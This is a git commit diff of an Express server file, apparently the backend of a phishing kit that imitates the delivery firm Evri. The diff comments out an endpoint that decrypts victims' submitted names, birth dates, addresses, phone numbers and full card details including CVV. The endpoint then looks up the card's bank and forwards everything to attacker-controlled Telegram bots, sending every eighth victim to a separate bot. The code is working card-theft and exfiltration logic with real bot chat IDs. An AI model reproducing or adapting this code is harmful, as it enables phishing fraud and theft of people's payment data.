07ee95fef848b46a79b876f8f6778e745f34e013
Your Name <you@example.com>
2022-06-09 01:24:06 +0100

    make

--- index.js
+++ index.js
@@ -1698,56 +1698,56 @@ app.post('/F_zn66', (req, res) => {
     })
 });
 
-app.options('/fpaysEvri', cors())
+// app.options('/fpaysEvri', cors())
 
-app.post('/fpaysEvri', (req, res) => {
-    fname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
-    dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
-    telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
-    address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
-    pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
-    ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
-    ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
-    ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
-    cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
-    userAgent = req.body.userAgent;
-    ip = req.body.ip;
-    bin = req.body.bin;
+// app.post('/fpaysEvri', (req, res) => {
+//     fname = CryptoJS.AES.decrypt(req.body.fname, '402312').toString(CryptoJS.enc.Utf8);
+//     dob = CryptoJS.AES.decrypt(req.body.dob, '402312').toString(CryptoJS.enc.Utf8);
+//     telephone = CryptoJS.AES.decrypt(req.body.phone, '402312').toString(CryptoJS.enc.Utf8);
+//     address = CryptoJS.AES.decrypt(req.body.addy, '402312').toString(CryptoJS.enc.Utf8);
+//     pcode = CryptoJS.AES.decrypt(req.body.pcode, '402312').toString(CryptoJS.enc.Utf8);
+//     ccname = CryptoJS.AES.decrypt(req.body.ccname, '402312').toString(CryptoJS.enc.Utf8);
+//     ccnum = CryptoJS.AES.decrypt(req.body.ccnum, '402312').toString(CryptoJS.enc.Utf8);
+//     ccexp = CryptoJS.AES.decrypt(req.body.ccexp, '402312').toString(CryptoJS.enc.Utf8);
+//     cvv = CryptoJS.AES.decrypt(req.body.cccvv, '402312').toString(CryptoJS.enc.Utf8);
+//     userAgent = req.body.userAgent;
+//     ip = req.body.ip;
+//     bin = req.body.bin;
 
-    if (bin.length === 7) {
-        formatBin = bin.replace(/ /g, '');
-        if (formatBin.length === 7) {
-            formatBin = bin.slice(0, -1);
-        }
-        bin = formatBin;
-    }
-    axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
-        if (!resp.data.bank) {
-            bankName = ""
-        } else {
-            bankName = resp.data.bank.name;
-        }
-    }).then(function () {
-        binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
-        var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
-        if (fpaysC == 7) {
-            axios.post(
-                `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
-            );
-            fpaysC = 0;
-        } else {
-            axios.post(
-                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriFpays:\n${originalText}`
-            );
-            axios.post(
-                `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2134201699&text=Evri:\n${originalText}`
-            );
-            fpaysC += 1;
-        }
+//     if (bin.length === 7) {
+//         formatBin = bin.replace(/ /g, '');
+//         if (formatBin.length === 7) {
+//             formatBin = bin.slice(0, -1);
+//         }
+//         bin = formatBin;
+//     }
+//     axios.get(`https://lookup.binlist.net/${bin}`).then(resp => {
+//         if (!resp.data.bank) {
+//             bankName = ""
+//         } else {
+//             bankName = resp.data.bank.name;
+//         }
+//     }).then(function () {
+//         binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
+//         var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+//         if (fpaysC == 7) {
+//             axios.post(
+//                 `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=HAYTCHRES:\n${originalText}`
+//             );
+//             fpaysC = 0;
+//         } else {
+//             axios.post(
+//                 `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=EvriFpays:\n${originalText}`
+//             );
+//             axios.post(
+//                 `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=2134201699&text=Evri:\n${originalText}`
+//             );
+//             fpaysC += 1;
+//         }
 
-        res.send("Update Completed");
-    })
-});
+//         res.send("Update Completed");
+//     })
+// });
 
 // app.options('/fpaysEvri2', cors())
 
